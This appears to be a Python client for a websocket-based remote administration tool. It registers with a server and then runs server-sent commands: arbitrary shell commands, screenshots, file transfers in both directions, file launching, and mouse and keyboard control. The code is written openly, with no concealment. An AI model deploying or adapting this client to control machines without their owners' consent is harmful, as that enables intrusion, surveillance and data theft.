import asyncio
import base64
import json
import os
import subprocess

import pyautogui

import websockets
from websockets import ConnectionClosed, ConnectionClosedError

CONFIG = {'host_id': ''}
IP = "ws://localhost:8765"


async def on_ready(websocket: websockets.ClientConnection):
    print("Loading configuration")
    global CONFIG
    if not os.path.exists("config.json"):
        with open("config.json", "w") as f:
            json.dump(CONFIG, f)
    else:
        with open("config.json", "r") as f:
            CONFIG = json.load(f)

    # Setting up client id if connecting for the first time
    if not CONFIG['host_id']:
        print("UUID not found. Requesting UUID")
        packet = dict()
        packet['type'] = "setup"
        await websocket.send(json.dumps(packet))
        async for message in websocket:
            CONFIG['host_id'] = message
            break
        with open("config.json", "w") as f:
            json.dump(CONFIG, f)


async def hello(websocket: websockets.ClientConnection):
    packet = dict()
    print(f"Authorizing with UUID: {CONFIG['host_id']}")
    packet['type'] = "hello"
    packet['host_id'] = CONFIG['host_id']
    await websocket.send(json.dumps(packet))
    async for message in websocket:
        print(message)
        break


async def heartbeat(websocket: websockets.ClientConnection):
    await asyncio.sleep(5)
    packet = dict()
    while True:
        packet['type'] = "heartbeat"
        await websocket.send(json.dumps(packet))
        await asyncio.sleep(5)


async def listen(websocket: websockets.ClientConnection):
    async def snip():
        print("Taking screenshot")
        pyautogui.screenshot("snip.png")
        packet = dict(data)
        with open("snip.png", mode="rb") as f:
            packet["data"] = base64.b64encode(f.read()).decode("ascii")
        await websocket.send(json.dumps(packet))

    async def upload():
        if not data.get("data", 0):
            packet = dict(data)
            await websocket.send(json.dumps(packet))
            return

        datafolder = f"downloads/"
        filename = data["filename"]
        filepath = os.path.join(datafolder, filename)

        os.makedirs(datafolder, exist_ok=True)

        with open(filepath, "wb") as f:
            f.write(base64.b64decode(data["data"]))
        print(f"Downloaded {data["filename"]}")

    async def download():
        packet = dict(data)
        with open(data["filename"], mode="rb") as f:
            packet["data"] = base64.b64encode(f.read()).decode("ascii")
        await websocket.send(json.dumps(packet))
        print(f"Uploaded {data["filename"]}")

    async def command():
        packet = dict(data)
        result = subprocess.run(data["command"], shell=True, text=True, capture_output=True)
        packet["out"], packet["err"] = result.stdout, result.stderr
        await websocket.send(json.dumps(packet))

    async def run():
        packet = dict(data)
        os.startfile(data["filename"])
        await websocket.send(json.dumps(packet))

    async def move():
        packet = dict(data)
        if data["relative"] == "False":
            pyautogui.moveTo(x=int(data["x"]), y=int(data["y"]))
        else:
            pyautogui.moveRel(xOffset=int(data["x"]), yOffset=int(data["y"]))
        await websocket.send(json.dumps(packet))

    async def click():
        packet = dict(data)
        if int(data["x"]) != -1 and int(data["y"]) != -1:
            pyautogui.click(x=int(data["x"]), y=int(data["y"]), button=data["button"], clicks=int(data["clicks"]))
        else:
            pyautogui.click(button=data["button"], clicks=int(data["clicks"]))
        await websocket.send(json.dumps(packet))

    async def write():
        packet = dict(data)
        pyautogui.typewrite(data["text"], float(data["speed"]))
        if data["enter"] == "True":
            pyautogui.press('enter')
        await websocket.send(json.dumps(packet))

    async def hotkey():
        packet = dict(data)
        pyautogui.hotkey(data["text"].split())
        await websocket.send(json.dumps(packet))

    func_map = {
        "snip": snip,
        "upload": upload,
        "download": download,
        'command': command,
        'run': run,
        'move': move,
        'click': click,
        'write': write,
        'hotkey': hotkey,
    }

    async for message in websocket:
        try:
            data = json.loads(message)
            await func_map[data['type']]()
        except json.JSONDecodeError:
            print("Invalid JSON data")
        except KeyError as e:
            print(f"Invalid key: {e}")


async def main():
    while True:
        try:
            print("Connecting to host server")
            async with websockets.connect(IP, max_size=100*1024*1024) as websocket:
                print("Connection established")
                await on_ready(websocket)
                await hello(websocket)

                heartbeat_task = asyncio.create_task(heartbeat(websocket))
                listen_task = asyncio.create_task(listen(websocket))

                await asyncio.gather(listen_task, heartbeat_task)
        except (ConnectionError,
                ConnectionClosed,
                ConnectionClosedError) as e:
            print(e)
            await asyncio.sleep(5)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
